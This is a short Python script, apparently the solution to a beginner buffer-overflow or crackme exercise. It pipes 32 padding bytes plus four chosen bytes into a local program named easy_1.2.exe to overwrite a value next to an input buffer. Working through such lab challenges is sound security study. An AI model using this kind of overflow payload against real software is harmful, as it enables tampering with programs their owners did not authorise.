from subprocess import PIPE, Popen

payload = b"a"*32 + b"\x53\x41\x42\x49"

p1 = Popen("easy\\easy_1.2.exe", stdin=PIPE)
p1.communicate(payload)
p1.wait()